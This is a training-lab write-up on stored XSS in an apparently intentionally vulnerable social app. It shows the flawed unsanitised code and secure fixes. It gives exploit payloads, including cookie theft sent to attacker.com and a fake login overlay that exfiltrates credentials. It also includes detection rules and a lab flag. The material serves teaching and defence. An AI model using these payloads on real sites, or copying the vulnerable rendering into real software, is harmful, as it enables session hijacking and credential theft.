# Stored XSS — Vulnerability Lab

## Overview

| Field | Detail |
|---|---|
| **ID** | V03 |
| **Type** | Stored XSS (Persistent XSS) |
| **OWASP** | A03:2021 — Injection |
| **CWE** | CWE-79: Cross-Site Scripting |
| **CVSS Score** | 8.8 High |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N |
| **Locations** | Posts, Comments, Profile Bio, Marketplace, Messages |
| **Difficulty** | Medium |

---

## Description

Stored XSS occurs when malicious scripts are saved to the database and executed when other users view the content. Unlike Reflected XSS, stored XSS:
- Persists across sessions
- Affects ALL users who view the content
- Can be used for cookie theft, account takeover, keylogging
- Is particularly dangerous on admin/moderator panels

---

## Vulnerable Code

### Backend — No sanitization on input
```typescript
// ⚠️ VULNERABLE: backend/src/controllers/postsController.ts
let processedContent: string;

if (config.trainingMode) {
  processedContent = content;  // ⚠️ No sanitization
}

const [post] = await db('posts').insert({
  content: processedContent,  // ⚠️ Stored as-is
  ...
});
```

### Frontend — dangerouslySetInnerHTML renders stored scripts
```tsx
// ⚠️ VULNERABLE: frontend/src/app/(main)/feed/page.tsx
{isTraining ? (
  <p dangerouslySetInnerHTML={{ __html: post.content }} />
) : (
  <p>{post.content}</p>  // 🔒 Text node, no HTML
)}
```

---

## How to Exploit

### Lab 1 — Basic Alert (Warmup) 🟡

Create a post with:
```html
<script>alert('XSS')</script>
```

Every user who views your post will trigger the alert.

### Lab 2 — Session Cookie Theft 🟡

**Goal:** Steal another user's session cookie

**Payload (post content):**
```html
<script>
  fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))
</script>
```

> In the lab, use the MailHog server as your "attacker" endpoint:
> `http://localhost:8025` — check for incoming requests

**Or with img tag (bypasses script blockers):**
```html
<img src="x" onerror="fetch('http://localhost:9999/c?'+document.cookie)">
```

### Lab 3 — DOM Manipulation 🟡

**Goal:** Overlay a fake login form to steal credentials

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center">
  <div style="background:#111;padding:40px;border-radius:12px;width:380px">
    <h2 style="color:white;text-align:center;margin-bottom:20px">Session expired — please login again</h2>
    <form onsubmit="fetch('http://localhost:9999/creds?u='+this.email.value+'&p='+this.pwd.value);return false">
      <input name="email" type="email" placeholder="Email" style="width:100%;padding:12px;margin-bottom:12px;border-radius:8px;border:none;background:#222;color:white">
      <input name="pwd" type="password" placeholder="Password" style="width:100%;padding:12px;margin-bottom:12px;border-radius:8px;border:none;background:#222;color:white">
      <button type="submit" style="width:100%;padding:12px;background:#6366f1;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:600">Login</button>
    </form>
  </div>
</div>
```

### Lab 4 — Profile Bio XSS 🟡

Go to Settings → Profile → Bio field. Enter:
```html
<img src=x onerror="document.title='Hacked by XSS'">
```

Any user visiting your profile will have their page title changed.

**Flag:** `SS{st0red_xss_c00kie_steal}`

---

## Attack Flow

```
Attacker                    Database                    Victim Browser
    │                           │                              │
    │ POST /posts               │                              │
    │ {content: "<script>..."}  │                              │
    │──────────────────────────►│                              │
    │                           │ Stored unsanitized           │
    │                           │                              │
    │ 200 OK                    │                              │
    │◄──────────────────────────│                              │
    │                           │                              │
    │                           │     GET /feed                │
    │                           │◄─────────────────────────────│
    │                           │                              │
    │                           │ Returns post with <script>   │
    │                           │──────────────────────────────►
    │                           │                              │
    │                           │         Script executes      │
    ◄───────────────────────────────────────────────────────── │
    │ Receives stolen cookie                                   │
```

---

## Secure Fix

### Backend — Sanitize on input
```typescript
import sanitizeHtml from 'sanitize-html';

// 🔒 SECURE: Strip all HTML tags
const cleanContent = sanitizeHtml(content, {
  allowedTags: [],
  allowedAttributes: {},
});
```

### Frontend — Render as text (never HTML)
```tsx
// 🔒 SECURE: Text node, XSS-safe
<p className="text-white">{post.content}</p>

// 🔒 If markdown needed, use a safe renderer:
import DOMPurify from 'dompurify';
<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }} />
```

### Content Security Policy
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

CSP prevents inline scripts and external script loading.

---

## Detection Rules

### Wazuh
```xml
<rule id="100003" level="12">
  <if_group>web</if_group>
  <match>POST /api/posts</match>
  <regex>\<script\>|\balert\(|onerror=|onload=|javascript:</regex>
  <description>Stored XSS payload in post content</description>
</rule>
```

### Sigma
```yaml
title: Stored XSS Payload Detection - SocialSphere Posts
status: stable
logsource:
  product: application
  service: socialsphere-api
detection:
  selection:
    EventID: POST_CREATED
    content|contains:
      - '<script'
      - 'javascript:'
      - 'onerror='
      - 'onload='
      - 'document.cookie'
  condition: selection
level: high
tags:
  - attack.t1059.007
```

---

## MITRE ATT&CK

| Tactic | Technique |
|---|---|
| Execution | T1059.007 — JavaScript |
| Credential Access | T1539 — Steal Web Session Cookie |
| Collection | T1185 — Browser Session Hijacking |

---

## Hints

### Medium 🟡
- Try creating a post with HTML content
- Check what the browser renders when you view the post
- Does `<b>bold text</b>` render as bold?
- If yes, try `<script>alert(1)</script>`
- Cookie theft: `document.cookie` contains the session
